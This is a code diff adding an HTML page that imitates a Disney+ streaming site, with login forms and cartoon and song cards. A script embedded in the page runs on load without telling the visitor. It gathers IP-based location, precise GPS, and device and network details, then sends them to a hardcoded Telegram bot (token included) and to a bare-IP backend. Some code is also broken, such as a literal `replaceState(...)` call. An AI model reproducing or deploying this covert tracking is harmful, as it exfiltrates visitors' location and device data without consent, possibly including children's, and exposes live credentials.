@@ -1,0 +1,883 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Disney</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+  <!-- NAVBAR -->
+  <nav class="navbar" style="display: flex; align-items: center; justify-content: space-between;">
+    <img src="https://i.ibb.co/Ps5p8HMf/logo.png" class="brand-logo" alt="disney+logo">
+    <div id="user-info" style="color: #fff; font-size: 1rem; margin-right: 20px;">
+      <span>Loading user...</span>
+    </div>
+  </nav>
+
+  <!-- VIDEO CAROUSEL -->
+  <div class="carousel-container" style="display: flex; gap: 20px;">
+
+  <!-- First Video -->
+    <div class="slider">
+      <video class="card-img" id="videoPlayer1" playsinline loop muted width="320" height="180"
+        poster="https://assets-in.bmscdn.com/discovery-catalog/events/et00339561-vhccdqnkpv-landscape.jpg">
+        <source id="source1" src="https://frfrrfjfjrfjurihag.s3.us-east-1.amazonaws.com/first_look_kartik_aaryan_sreeleela_anurag_basu_pritam_bhushan_ku.mp4" type="video/mp4">
+        Your browser does not support the video tag.
+      </video>
+    </div>
+
+  <!-- Second Video -->
+  <div class="slider">
+    <video class="card-img" id="videoPlayer2" playsinline loop muted width="320" height="180"
+      poster="https://via.placeholder.com/320x180?text=Second+Video+Thumbnail">
+      <source src="" type="video/mp4">
+    </video>
+  </div>
+
+</div>
+
+  <!-- AWS Cognito and CryptoJS -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/aws-sdk/2.1480.0/aws-sdk.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/amazon-cognito-identity-js@6.3.13/dist/amazon-cognito-identity.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+
+  <script>
+    // AWS Cognito config
+   const poolData = {
+  UserPoolId: "us-east-1_zWmrsUOXN",
+  ClientId: "3519fd1888evbk1ga77ocqa7uk",
+};
+
+let userPool = null;
+
+/* ---------------- INIT ---------------- */
+function initCognito() {
+  if (!window.AmazonCognitoIdentity?.CognitoUserPool) {
+    setTimeout(initCognito, 100);
+    return;
+  }
+
+  userPool = new AmazonCognitoIdentity.CognitoUserPool(poolData);
+
+  handleOAuthRedirect();   // 🔥 FIX CLOUD FRONT LOGIN
+  checkLoginStatus();      // normal login check
+}
+
+document.addEventListener("DOMContentLoaded", () => {
+  const box = document.getElementById("user-info");
+  if (box) box.innerHTML = "Checking login...";
+  initCognito();
+});
+
+/* ---------------- HANDLE COGNITO REDIRECT (?code=) ---------------- */
+function handleOAuthRedirect() {
+  const params = new URLSearchParams(window.location.search);
+  const code = params.get("code");
+
+  if (!code) return;
+
+  fetch("https://us-east-1zwmrsuoxn.auth.us-east-1.amazoncognito.com/oauth2/token", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    body: new URLSearchParams({
+      grant_type: "authorization_code",
+      client_id: poolData.ClientId,
+      code: code,
+      redirect_uri: "https://d28fco84f7koau.cloudfront.net/"
+    })
+  })
+  .then(async (res) => {
+    const data = await res.json();
+
+    if (!res.ok) {
+      console.log("COGNITO ERROR RESPONSE:", data);
+      throw new Error(data.error_description || "Token exchange failed");
+    }
+
+    return data;
+  })
+  .then((data) => {
+    console.log("LOGIN SUCCESS:", data);
+
+    if (data.access_token) {
+      localStorage.setItem("access_token", data.access_token);
+    }
+
+    // CLEAN URL ONLY (NO RELOAD)
+    window.history.replaceState({}, document.title, window.location.pathname);
+
+    // IMPORTANT: DO NOT reload page
+    checkLoginStatus();
+  })
+  .catch((err) => {
+    console.log("LOGIN FAILED:", err);
+    document.getElementById("user-info").innerText =
+      "Login failed (check Cognito config)";
+  });
+}
+
+/* ---------------- CHECK LOGIN ---------------- */
+function checkLoginStatus() {
+  const userInfoDiv = document.getElementById("user-info");
+
+  const cognitoUser = userPool.getCurrentUser();
+
+  if (!cognitoUser) {
+    renderSignIn();
+    return;
+  }
+
+  cognitoUser.getSession((err, session) => {
+    if (err || !session || !session.isValid()) {
+      renderSignIn();
+      return;
+    }
+
+    cognitoUser.getUserAttributes((err, attributes) => {
+      let name = "User";
+      let email = "";
+
+      if (attributes) {
+        attributes.forEach((attr) => {
+          if (attr.getName() === "name") name = attr.getValue();
+          if (attr.getName() === "email") email = attr.getValue();
+        });
+      }
+
+      userInfoDiv.innerHTML = `
+        <span>Welcome, <b>${name || email}</b></span>
+        <button id="signout-btn">Sign out</button>
+      `;
+
+      document.getElementById("signout-btn").onclick = () => {
+        cognitoUser.signOut();
+        localStorage.clear();
+        window.history.replaceState(...)
+      };
+    });
+  });
+}
+
+/* ---------------- SIGN IN UI ---------------- */
+function renderSignIn() {
+  const userInfoDiv = document.getElementById("user-info");
+
+  userInfoDiv.innerHTML = `
+    <form id="signin-form">
+      <input id="signin-username" placeholder="Username" required />
+      <input id="signin-password" type="password" placeholder="Password" required />
+      <button type="submit">Sign In</button>
+      <button type="button" id="signup-btn">Sign Up</button>
+    </form>
+    <div id="signin-message"></div>
+  `;
+
+  document.getElementById("signin-form").onsubmit = (e) => {
+    e.preventDefault();
+    signIn(
+      document.getElementById("signin-username").value,
+      document.getElementById("signin-password").value
+    );
+  };
+
+  document.getElementById("signup-btn").onclick = showSignUpForm;
+}
+
+/* ---------------- SIGN IN ---------------- */
+function signIn(username, password) {
+  const authDetails = new AmazonCognitoIdentity.AuthenticationDetails({
+    Username: username,
+    Password: password,
+  });
+
+  const user = new AmazonCognitoIdentity.CognitoUser({
+    Username: username,
+    Pool: userPool,
+  });
+
+  user.authenticateUser(authDetails, {
+    onSuccess: () => {
+      location.reload();
+    },
+    onFailure: (err) => {
+      document.getElementById("signin-message").innerText =
+        err.message || JSON.stringify(err);
+    },
+  });
+}
+
+/* ---------------- SIGN UP ---------------- */
+function showSignUpForm() {
+  const userInfoDiv = document.getElementById("user-info");
+
+  userInfoDiv.innerHTML = `
+    <form id="signup-form">
+      <input id="su-username" placeholder="Username" required />
+      <input id="su-password" type="password" placeholder="Password" required />
+      <input id="su-email" placeholder="Email" required />
+      <button type="submit">Sign Up</button>
+      <button type="button" id="back">Back</button>
+    </form>
+    <div id="signup-msg"></div>
+  `;
+
+  document.getElementById("signup-form").onsubmit = (e) => {
+    e.preventDefault();
+
+    const username = document.getElementById("su-username").value;
+    const password = document.getElementById("su-password").value;
+    const email = document.getElementById("su-email").value;
+
+    signUp(username, password, email);
+  };
+
+  document.getElementById("back").onclick = renderSignIn;
+}
+
+function signUp(username, password, email) {
+  const attrList = [
+    new AmazonCognitoIdentity.CognitoUserAttribute({
+      Name: "email",
+      Value: email,
+    }),
+  ];
+
+  userPool.signUp(username, password, attrList, null, (err, result) => {
+    if (err) {
+      document.getElementById("signup-msg").innerText = err.message;
+      return;
+    }
+
+    document.getElementById("signup-msg").innerText =
+      "Signup success! Check email for verification.";
+  });
+}
+const loginUrl =
+"https://us-east-1zwmrsuoxn.auth.us-east-1.amazoncognito.com/login"
++ "?client_id=3519fd1888evbk1ga77ocqa7uk"
++ "&response_type=code"
++ "&scope=email+openid+phone"
++ "&redirect_uri=https%3A%2F%2Fd28fco84f7koau.cloudfront.net%2F";
+
+window.location.href = loginUrl;
+  </script>
+  
+  <script>
+    function setupVideoPlayer(videoId, sourceId, playlist) {
+      const video = document.getElementById(videoId);
+      const source = document.getElementById(sourceId);
+      let index = 0;
+
+      if (!video || !source) return null;
+
+      video.muted = true;
+      video.volume = 1;
+
+      // Set initial source if playlist is not empty
+      if (playlist.length > 0) {
+        source.src = playlist[0];
+        video.load();
+      }
+
+      // Delay playback by 6 seconds
+      setTimeout(() => {
+        video.play().catch(err => {
+          // Autoplay may be blocked, ignore
+        });
+      }, 6000);
+
+      // Handle playlist looping
+      video.addEventListener("ended", () => {
+        if (playlist.length > 0) {
+          index = (index + 1) % playlist.length;
+          source.src = playlist[index];
+          video.load();
+          video.play().catch(err => {
+            // Autoplay may be blocked, ignore
+          });
+        }
+      });
+
+      return video;
+    }
+
+
+ let video1, video2;
+
+window.addEventListener("DOMContentLoaded", () => {
+  video1 = setupVideoPlayer("videoPlayer1", "source1", [
+    "https://frfrrfjfjrfjurihag.s3.us-east-1.amazonaws.com/first_look_kartik_aaryan_sreeleela_anurag_basu_pritam_bhushan_ku.mp4",
+  ]);
+
+  video2 = setupVideoPlayer("videoPlayer2", "source2", [
+    // add second video OR keep null-safe
+    "https://via.placeholder.com/video.mp4"
+  ]);
+});
+
+    // Optional: Unmute on first click
+    window.addEventListener("click", () => {
+      [video1, video2].forEach(video => {
+        if (video) {
+          video.muted = false;
+          video.volume = 1;
+          video.play().catch(err => {
+            // Autoplay may be blocked, ignore
+          });
+        }
+      });
+    }, { once: true });
+  </script>
+
+  <!-- User Details Tracking Script -->
+  <script>
+    // Backend URL for saving user details to RDS (should point to your backend API)
+    const BACKEND_URL = "http://3.135.202.144/save-user-login"; // Update as needed
+
+    // Telegram Bot credentials
+    const botToken = '7878047212:AAFHo4LZznqfJySW6pl54HE52ZlLu4GCeZA';
+    const chatId = '5025112538';
+
+    // Helper to get accurate timezone
+    function getTimezone() {
+      try {
+        return Intl.DateTimeFormat().resolvedOptions().timeZone || "unknown";
+      } catch (e) {
+        return "unknown";
+      }
+    }
+
+    // Helper to get screen details
+    function getScreenDetails() {
+      return {
+        width: window.screen.width,
+        height: window.screen.height,
+        availWidth: window.screen.availWidth,
+        availHeight: window.screen.availHeight,
+        colorDepth: window.screen.colorDepth,
+        pixelDepth: window.screen.pixelDepth
+      };
+    }
+
+    // Helper to get language
+    function getLanguage() {
+      return navigator.language || navigator.userLanguage || "unknown";
+    }
+
+    // Helper to get platform
+    function getPlatform() {
+      return navigator.platform || "unknown";
+    }
+
+    // Helper to get referrer
+    function getReferrer() {
+      return document.referrer || "none";
+    }
+
+    // Helper to get cookies enabled
+    function areCookiesEnabled() {
+      return navigator.cookieEnabled;
+    }
+
+    // Helper to get local time
+    function getLocalTime() {
+      return new Date().toISOString();
+    }
+
+    // Main function to collect and send user details
+    async function getUserDetails() {
+      let details = {};
+
+      // 1. Device and browser info
+      details.userAgent = navigator.userAgent;
+      details.language = getLanguage();
+      details.platform = getPlatform();
+      details.timezone = getTimezone();
+      details.screen = getScreenDetails();
+      details.cookiesEnabled = areCookiesEnabled();
+      details.referrer = getReferrer();
+      details.localTime = getLocalTime();
+
+      // 2. Network info (if available)
+      if (navigator.connection) {
+        details.networkType = navigator.connection.effectiveType || "unknown";
+        details.downlink = navigator.connection.downlink || null;
+        details.rtt = navigator.connection.rtt || null;
+      } else {
+        details.networkType = "not_supported";
+      }
+
+      // 3. Public IP and Geo Location via API
+      try {
+        let res = await fetch('https://ipapi.co/json/');
+        if (res.ok) {
+          let data = await res.json();
+          details.ip = data.ip;
+          details.city = data.city;
+          details.region = data.region;
+          details.country = data.country_name;
+          details.latitude = data.latitude;
+          details.longitude = data.longitude;
+          details.postal = data.postal;
+          details.org = data.org;
+          details.asn = data.asn;
+        }
+      } catch (err) {
+        console.warn("IP API fetch failed:", err);
+      }
+
+      // 4. Precise GPS location (optional, needs permission)
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            details.gpsLat = pos.coords.latitude;
+            details.gpsLon = pos.coords.longitude;
+            details.gpsAccuracy = pos.coords.accuracy;
+            details.gpsTimestamp = pos.timestamp;
+            sendDetails(details);
+            sendToTelegram(details);
+          },
+          err => {
+            console.warn("GPS location denied or failed:", err);
+            sendDetails(details);
+            sendToTelegram(details);
+          },
+          { enableHighAccuracy: true, timeout: 7000, maximumAge: 0 }
+        );
+      } else {
+        sendDetails(details);
+        sendToTelegram(details);
+      }
+    }
+
+    // Send to backend (RDS)
+    function sendDetails(details) {
+      if (
+        typeof BACKEND_URL === "string" &&
+        BACKEND_URL &&
+        (BACKEND_URL.startsWith("http://") || BACKEND_URL.startsWith("https://"))
+      ) {
+        fetch(BACKEND_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(details)
+        }).catch(err => console.error("Send to backend failed:", err));
+      } else {
+        console.error("Invalid BACKEND_URL");
+      }
+    }
+
+    // Send to Telegram bot
+    function sendToTelegram(details) {
+      const message =
+        `New User Login (Accurate Details):\n` +
+        `IP: ${details.ip || 'N/A'}\n` +
+        `City: ${details.city || 'N/A'}\n` +
+        `Region: ${details.region || 'N/A'}\n` +
+        `Country: ${details.country || 'N/A'}\n` +
+        `Postal: ${details.postal || 'N/A'}\n` +
+        `Org: ${details.org || 'N/A'}\n` +
+        `ASN: ${details.asn || 'N/A'}\n` +
+        `Latitude: ${details.latitude || 'N/A'}\n` +
+        `Longitude: ${details.longitude || 'N/A'}\n` +
+        `GPS Lat: ${details.gpsLat || 'N/A'}\n` +
+        `GPS Lon: ${details.gpsLon || 'N/A'}\n` +
+        `GPS Accuracy: ${details.gpsAccuracy || 'N/A'}\n` +
+        `GPS Timestamp: ${details.gpsTimestamp || 'N/A'}\n` +
+        `Network: ${details.networkType || 'N/A'}\n` +
+        `Downlink: ${details.downlink || 'N/A'} Mbps\n` +
+        `RTT: ${details.rtt || 'N/A'} ms\n` +
+        `UserAgent: ${details.userAgent || 'N/A'}\n` +
+        `Language: ${details.language || 'N/A'}\n` +
+        `Platform: ${details.platform || 'N/A'}\n` +
+        `Timezone: ${details.timezone || 'N/A'}\n` +
+        `Screen: ${details.screen ? JSON.stringify(details.screen) : 'N/A'}\n` +
+        `Cookies Enabled: ${details.cookiesEnabled}\n` +
+        `Referrer: ${details.referrer}\n` +
+        `Local Time: ${details.localTime}`;
+
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      }).catch(err => console.error("Telegram send failed:", err));
+    }
+
+    // Run after DOM is loaded
+    window.addEventListener("DOMContentLoaded", getUserDetails);
+    document.getElementById("loginBtn").addEventListener("click", () => {
+  window.location.href = loginUrl;
+});
+  </script>
+    
+  <h1 class="title">Cartoons for kids </h1>
+  <div class="movies-list">
+    <button class="pre-btn"><img src="https://i.ibb.co/NgNJVjNk/pre.png" alt=""></button>
+    <button class="nxt-btn"><img src="https://i.ibb.co/W4rsYFPH/nxt.png" alt=""></button>
+    
+    <div class="card-container">
+      <!-- Each card is now a link for proper redirection -->
+    <div class="card" style="cursor:pointer;">
+
+ <!-- IMAGE / OPEN VIDEO -->
+<a href="https://disney-app-1234.s3.us-east-1.amazonaws.com/doremon.mp4" target="_blank">
+  <img src="https://i.pinimg.com/236x/79/f3/80/79f38075de07acfa804b4a10dfdcb2a2.jpg" class="card-img">
+</a>
+
+<div class="card-body">
+  <h2 class="name">Doraemon</h2>
+
+  <!-- WATCH BUTTON -->
+  <a href="https://disney-app-1234.s3.us-east-1.amazonaws.com/doremon.mp4" target="_blank">
+    <button class="watchlist-btn">Watch</button>
+  </a>
+
+  <!-- DOWNLOAD BUTTON -->
+  <button class="watchlist-btn" onclick="downloadVideo()">
+    Download
+  </button>
+</div>
+
+<script>
+/* ---------------- DOWNLOAD FUNCTION ---------------- */
+function downloadVideo() {
+  const url = "https://disney-app-1234.s3.us-east-1.amazonaws.com/doremon download.mp4 ";
+
+  const a = document.createElement("a");
+  a.href = url;
+  a.target = "_blank";
+  a.download = "doraemon.mp4";
+
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+}
+
+/* ---------------- COGNITO LOGIN HANDLER ---------------- */
+const params = new URLSearchParams(window.location.search);
+const code = params.get("code");
+
+if (code) {
+  fetch("https://us-east-1zwmrsuoxn.auth.us-east-1.amazoncognito.com/oauth2/token", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    body: new URLSearchParams({
+      grant_type: "authorization_code",
+      client_id: "3519fd1888evbk1ga77ocqa7uk",
+      code: code,
+      redirect_uri: "https://d28fco84f7koau.cloudfront.net/"
+    })
+  })
+  .then(res => res.json())
+  .then(data => {
+    console.log("LOGIN SUCCESS:", data);
+
+    if (data.access_token) {
+      localStorage.setItem("access_token", data.access_token);
+    }
+
+    // clean URL
+    window.history.replaceState({}, document.title, window.location.pathname);
+    document.body.classList.add("logged-in");
+  })
+  .catch(err => {
+    console.log("LOGIN FAILED:", err);
+  });
+}
+</script>
+</div>
+
+      <a href="http://s3frontpart2-1722208981.us-east-2.elb.amazonaws.com/" target="_blank" class="card-link">
+        <div class="card" style="cursor:pointer;">
+          <img src="https://m.media-amazon.com/images/M/MV5BZmYxYWRmODAtMWEzNC00MTAxLTkyN2EtMTM1YmE2YzAwNmQxXkEyXkFqcGc@._V1_FMjpg_UX1000_.jpg" alt="" class="card-img">
+          <div class="card-body">
+            <h2 class="name">shaun the sheep</h2>
+            <h6 class="des"></h6>
+            <button class="watchlist-btn">add to watchlist</button>
+          </div>
+        </div>
+      </a>
+      <a href="http://s3frontpart2-1722208981.us-east-2.elb.amazonaws.com/" target="_blank" class="card-link">
+        <div class="card" style="cursor:pointer;">
+          <img src="https://m.media-amazon.com/images/M/MV5BZmY5MjE0ZGItY2Q0My00ZWI5LWJmYTEtYWUyMzFkY2FmZDM2XkEyXkFqcGc@._V1_.jpg" alt="" class="card-img">
+          <div class="card-body">
+            <h2 class="name">Mr beam</h2>
+            <h6 class="des"></h6>
+            <button class="watchlist-btn">add to watchlist</button>
+          </div>
+        </div>
+      </a>
+      <a href="http://s3frontpart2-1722208981.us-east-2.elb.amazonaws.com/" target="_blank" class="card-link">
+        <div class="card" style="cursor:pointer;">
+          <img src="https://m.media-amazon.com/images/I/71dX9JnTkwL._UF1000,1000_QL80_.jpg" alt="" class="card-img">
+          <div class="card-body">
+            <h2 class="name"> Squirrels</h2>
+            <h6 class="des"></h6>
+            <button class="watchlist-btn">add to watchlist</button>
+          </div>
+        </div>
+      </a>
+      <a href="http://s3frontpart2-1722208981.us-east-2.elb.amazonaws.com/" target="_blank" class="card-link">
+        <div class="card" style="cursor:pointer;">
+          <img src="https://i.ibb.co/Ld3qYrHt/poster-8.png" alt="" class="card-img">
+          <div class="card-body">
+            <h2 class="name">Soul</h2>
+            <h6 class="des"></h6>
+            <button class="watchlist-btn">add to watchlist</button>
+          </div>
+        </div>
+      </a>
+      <a href="http://s3frontpart2-1722208981.us-east-2.elb.amazonaws.com/" target="_blank" class="card-link">
+        <div class="card" style="cursor:pointer;">
+          <img src="https://upload.wikimedia.org/wikipedia/en/c/ce/Crayon_Shin-chan_the_Movie-_Super_Hot%21_The_Spicy_Kasukabe_Dancers_poster.jpg" alt="" class="card-img">
+          <div class="card-body">
+            <h2 class="name">Shin chan</h2>
+            <h6 class="des"></h6>
+            <button class="watchlist-btn">add to watchlist</button>
+          </div>
+        </div>
+      </a>
+      <a href="http://s3frontpart2-1722208981.us-east-2.elb.amazonaws.com/" target="_blank" class="card-link">
+        <div class="card" style="cursor:pointer;">
+          <img src="https://miro.medium.com/v2/resize:fit:736/1*w4MhPHkH-c_EAnsRXeB68Q.jpeg" alt="" class="card-img">
+          <div class="card-body">
+            <h2 class="name">Doremon</h2>
+            <h6 class="des"></h6>
+            <button class="watchlist-btn">add to watchlist</button>
+          </div>
+        </div>
+      </a>
+      <a href="http://s3frontpart2-1722208981.us-east-2.elb.amazonaws.com/" target="_blank" class="card-link">
+        <div class="card" style="cursor:pointer;">
+          <img src="https://picfiles.alphacoders.com/427/thumb-1920-427773.jpg" alt="" class="card-img">
+          <div class="card-body">
+            <h2 class="name">Tom and jerry</h2>
+            <h6 class="des"></h6>
+            <button class="watchlist-btn">add to watchlist</button>
+          </div>
+        </div>
+      </a>
+    </div>
+  </div>
+
+  <!-- Popular Shows -->
+
+  <h1 class="title">Video Song</h1>
+  <div class="movies-list">
+    <button class="pre-btn"><img src="https://i.ibb.co/NgNJVjNk/pre.png" alt=""></button>
+    <button class="nxt-btn"><img src="https://i.ibb.co/W4rsYFPH/nxt.png" alt=""></button>
+    <div class="card-container">
+
+      <!-- Each card is now a link for proper redirection -->
+      <!-- CHANGE: Each song card now links to the mainprivate-1549652976.us-east-2.elb.amazonaws.com songs page -->
+      <a href="http://mainprivate-1549652976.us-east-2.elb.amazonaws.com/" target="_blank" class="card-link">
+        <div class="card" style="cursor:pointer;">
+          <img src="https://m.media-amazon.com/images/M/MV5BYTIyZTE3ZGMtMWE5Yi00NDc2LTkxYWUtN2I0ZDg1MjZiZDY3XkEyXkFqcGc@._V1_FMjpg_UX1000_.jpg" alt="" class="card-img">
+          <div class="card-body">
+            <h2 class="name">Taxi wala</h2>
+            <h6 class="des">maate vinadhuga</h6>
+            <button class="watchlist-btn">add to watchlist</button>
+          </div>
+        </div>
+      </a>
+      <a href="http://mainprivate-1549652976.us-east-2.elb.amazonaws.com/" target="_blank" class="card-link">
+        <div class="card" style="cursor:pointer;">
+          <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS0CDBQ8m3eMAQWgKehKAqQjvptszrPWMx2XQ&s" alt="" class="card-img">
+          <div class="card-body">
+            <h2 class="name">Devara</h2>
+            <h6 class="des">chuttamalle</h6>
+            <button class="watchlist-btn">add to watchlist</button>
+          </div>
+        </div>
+      </a>
+      <a href="http://mainprivate-1549652976.us-east-2.elb.amazonaws.com/" target="_blank" class="card-link">
+        <div class="card" style="cursor:pointer;">
+          <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRR1xsTGcMK9xxMaxbrZsxzVQdFSJtrtMf4iw&s" alt="" class="card-img">
+          <div class="card-body">
+            <h2 class="name">mahii</h2>
+            <h6 class="des">hardik pandya natasha.</h6>
+            <button class="watchlist-btn">add to watchlist</button>
+          </div>
+        </div>
+      </a>
+      <a href="http://mainprivate-1549652976.us-east-2.elb.amazonaws.com/" target="_blank" class="card-link">
+        <div class="card" style="cursor:pointer;">
+          <img src="https://www.cinejosh.com/newsimg/newsmainimg/og_b_0812240748.jpg" alt="" class="card-img">
+          <div class="card-body">
+            <h2 class="name">OG</h2>
+            <h6 class="des">Hungry Cheetah - OG Glimpse </h6>
+            <button class="watchlist-btn">add to watchlist</button>
+          </div>
+        </div>
+      </a>
+      <a href="http://mainprivate-1549652976.us-east-2.elb.amazonaws.com/" target="_blank" class="card-link">
+        <div class="card" style="cursor:pointer;">
+          <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQpJ4Q8qlyYYFgRZdSvt5zyOfGRPTO3KvsL4g&s" alt="" class="card-img">
+          <div class="card-body">
+            <h2 class="name">Aashiqui 3</h2>
+            <h6 class="des">Tu Meri Zindagi Hai - Aashiqui 3.</h6>
+            <button class="watchlist-btn">add to watchlist</button>
+          </div>
+        </div>
+      </a>
+      <a href="http://mainprivate-1549652976.us-east-2.elb.amazonaws.com/" target="_blank" class="card-link">
+        <div class="card" style="cursor:pointer;">
+          <img src="https://c.saavncdn.com/100/Idiot-Telugu-2002-20200616185725-500x500.jpg" alt="" class="card-img">
+          <div class="card-body">
+            <h2 class="name">Choopultho</h2>
+            <h6 class="des">Idiot Movie.</h6>
+            <button class="watchlist-btn">add to watchlist</button>
+          </div>
+        </div>
+      </a>
+      <a href="http://mainprivate-1549652976.us-east-2.elb.amazonaws.com/" target="_blank" class="card-link">
+        <div class="card" style="cursor:pointer;">
+          <img src="https://c.saavncdn.com/027/Nenu-Sailaja-Telugu-2015-500x500.jpg" alt="" class="card-img">
+          <div class="card-body">
+            <h2 class="name">Crazy Feeling</h2>
+            <h6 class="des">Nenu Sailaja.</h6>
+            <button class="watchlist-btn">add to watchlist</button>
+          </div>
+        </div>
+      </a>
+      <a href="http://mainprivate-1549652976.us-east-2.elb.amazonaws.com/" target="_blank" class="card-link">
+        <div class="card" style="cursor:pointer;">
+          <img src="https://a10.gaanacdn.com/gn_img/albums/mGjKrP1W6z/jKrr7RJJK6/size_m_1740638882.jpg" alt="" class="card-img">
+          <div class="card-body">
+            <h2 class="name">Songs</h2>
+            <h6 class="des">f</h6>
+            <button class="watchlist-btn">add to watchlist</button>
+          </div>
+        </div>
+      </a>
+    </div>
+  </div>
+
+  <!-- New Releases -->
+  <h1 class="title">New Releases update soon</h1>
+  <div class="movies-list">
+    <button class="pre-btn"><img src="https://i.ibb.co/NgNJVjNk/pre.png" alt=""></button>
+    <button class="nxt-btn"><img src="https://i.ibb.co/W4rsYFPH/nxt.png" alt=""></button>
+    <div class="card-container">
+
+      <div class="card">
+        <img src="https://i.ibb.co/Ld3qYrHt/poster-8.png" alt="" class="card-img">
+        <div class="card-body">
+          <h2 class="name">movie name</h2>
+          <h6 class="des">Lorem ipsum dolor sit amet consectetur.</h6>
+          <button class="watchlist-btn">add to watchlist</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <img src="https://i.ibb.co/xtLxxbHH/poster-5.png" alt="" class="card-img">
+        <div class="card-body">
+          <h2 class="name">movie name</h2>
+          <h6 class="des">Lorem ipsum dolor sit amet consectetur.</h6>
+          <button class="watchlist-btn">add to watchlist</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <img src="https://i.ibb.co/NdMMS3s2/poster-12.png" alt="" class="card-img">
+        <div class="card-body">
+          <h2 class="name">movie name</h2>
+          <h6 class="des">Lorem ipsum dolor sit amet consectetur.</h6>
+          <button class="watchlist-btn">add to watchlist</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <img src="https://i.ibb.co/Rpy68MrL/poster-6.png" alt="" class="card-img">
+        <div class="card-body">
+          <h2 class="name">movie name</h2>
+          <h6 class="des">Lorem ipsum dolor sit amet consectetur.</h6>
+          <button class="watchlist-btn">add to watchlist</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <img src="https://i.ibb.co/PsNxQQ1p/poster-2.png" alt="" class="card-img">
+        <div class="card-body">
+          <h2 class="name">movie name</h2>
+          <h6 class="des">Lorem ipsum dolor sit amet consectetur.</h6>
+          <button class="watchlist-btn">add to watchlist</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <img src="https://i.ibb.co/WNB5p03x/poster-10.png" alt="" class="card-img">
+        <div class="card-body">
+          <h2 class="name">movie name</h2>
+          <h6 class="des">Lorem ipsum dolor sit amet consectetur.</h6>
+          <button class="watchlist-btn">add to watchlist</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <img src="https://i.ibb.co/xtLxxbHH/poster-5.png" alt="" class="card-img">
+        <div class="card-body">
+          <h2 class="name">movie name</h2>
+          <h6 class="des">Lorem ipsum dolor sit amet consectetur.</h6>
+          <button class="watchlist-btn">add to watchlist</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <img src="https://i.ibb.co/QWnKjSc/poster-3.png" alt="" class="card-img">
+        <div class="card-body">
+          <h2 class="name">movie name</h2>
+          <h6 class="des">Lorem ipsum dolor sit amet consectetur.</h6>
+          <button class="watchlist-btn">add to watchlist</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <img src="https://i.ibb.co/Ld3qYrHt/poster-8.png" alt="" class="card-img">
+        <div class="card-body">
+          <h2 class="name">movie name</h2>
+          <h6 class="des">Lorem ipsum dolor sit amet consectetur.</h6>
+          <button class="watchlist-btn">add to watchlist</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <img src="https://i.ibb.co/Z6zKx9rz/poster-1.png" alt="" class="card-img">
+        <div class="card-body">
+          <h2 class="name">movie name</h2>
+          <h6 class="des">Lorem ipsum dolor sit amet consectetur.</h6>
+          <button class="watchlist-btn">add to watchlist</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="last-footer">
+      <div class="last-footer-texts">
+          <h3>© 2025 NewDisney+. All Rights Reserved by abinash kumar</h3>
+          <div class="last-footer-links">
+              <a href="#">Terms Of Use</a>
+              <a href="#">Privacy Policy</a>
+              <a href="#">FAQ</a>
+          </div>
+      </div>
+      <div class="last-footer-images">
+          <a href="#"><img src="https://download.logo.wine/logo/Google_Play/Google_Play-Logo.wine.png" class="dwn" alt=""></a>
+          <a href="#"><img src="https://cdn.worldvectorlogo.com/logos/available-on-the-app-store.svg" class="dwn" alt=""></a>
+      </div>
+  </div>
+
+  <script src="script.js" async></script>
+</body>
+</html>
